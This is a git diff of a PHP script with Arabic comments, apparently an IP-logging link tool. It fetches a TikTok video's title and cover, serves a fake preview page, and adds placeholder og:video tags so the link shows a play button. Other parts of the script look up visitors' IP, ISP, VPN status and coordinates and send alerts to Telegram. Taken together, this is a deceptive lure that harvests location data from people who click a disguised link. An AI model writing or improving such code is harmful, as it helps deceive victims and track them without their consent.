@@ -26,7 +26,7 @@ if (isset($_GET['proxy_img'])) {
     if ($image_data && function_exists('imagecreatefromstring')) {
         $src = @imagecreatefromstring($image_data);
         if ($src) {
-            $w = imagesx($src); $h = imagesy($src); $target_size = 800; // حجم مربع احترافي
+            $w = imagesx($src); $h = imagesy($src); $target_size = 800; 
             
             $dst = imagecreatetruecolor($target_size, $target_size);
             $bg = imagecreatetruecolor($target_size, $target_size);
@@ -37,11 +37,10 @@ if (isset($_GET['proxy_img'])) {
             $x = ($target_size - $new_w) / 2; $y = ($target_size - $new_h) / 2;
             imagecopyresampled($bg, $src, $x, $y, 0, 0, $new_w, $new_h, $w, $h);
             
-            // تمويه وتغميق الخلفية
             for ($i = 0; $i < 15; $i++) { imagefilter($bg, IMG_FILTER_GAUSSIAN_BLUR); }
             imagefilter($bg, IMG_FILTER_BRIGHTNESS, -60);
 
-            // 2. وضع الصورة الأصلية في المنتصف (لتكون بارزة)
+            // 2. وضع الصورة الأصلية في المنتصف
             $scale_center = $target_size / $h; 
             $new_w_center = $w * $scale_center; 
             $new_h_center = $target_size;
@@ -142,11 +141,9 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// ✅ إضافة كلمة TikTok - تلقائياً
 function fetch_tiktok_exclusive_meta($url) {
     $meta = ['title' => 'فيديو تيك توك', 'image' => ''];
     
-    // 1. oEmbed (سريع)
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
     curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_CONNECTTIMEOUT => 3, CURLOPT_ENCODING => "", CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0']);
     $response = curl_exec($ch); curl_close($ch);
@@ -159,25 +156,21 @@ function fetch_tiktok_exclusive_meta($url) {
         }
     }
     
-    // 2. استخراج من صفحة الويب (عنيد جداً)
     $ch = curl_init($url);
     curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)']);
     $html = curl_exec($ch); curl_close($ch);
     
     if ($html) {
-        // جلب العنوان
         if (preg_match('/"desc":"([^"]+)"/', $html, $matches)) {
             $meta['title'] = html_entity_decode(stripslashes($matches[1]), ENT_QUOTES, 'UTF-8');
         } elseif (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
             $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
         }
         
-        // إضافة اللاحقة إذا لم تكن موجودة
         if (stripos($meta['title'], 'TikTok') === false) {
             $meta['title'] = 'TikTok - ' . $meta['title'];
         }
 
-        // جلب الصورة
         if (preg_match('/"cover":"([^"]+)"/', $html, $matches)) {
             $meta['image'] = str_replace('\\u002F', '/', $matches[1]);
         } elseif (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
@@ -195,7 +188,6 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// ✅ تحديد المتعامل بدقة
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
@@ -262,12 +254,19 @@ if (isset($_GET['r'])) {
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
-            echo '<meta property="og:description" content="شاهد الفيديو الآن">';
             echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:width" content="800">';
             echo '<meta property="og:image:height" content="800">';
             echo '<meta property="og:type" content="video.other">';
+            
+            // إضافة وسوم الفيديو لجعل زر التشغيل يظهر
+            echo '<meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4">';
+            echo '<meta property="og:video:secure_url" content="https://www.w3schools.com/html/mov_bbb.mp4">';
+            echo '<meta property="og:video:type" content="video/mp4">';
+            echo '<meta property="og:video:width" content="800">';
+            echo '<meta property="og:video:height" content="800">';
+            
             echo '</head><body></body></html>';
             exit();
         }
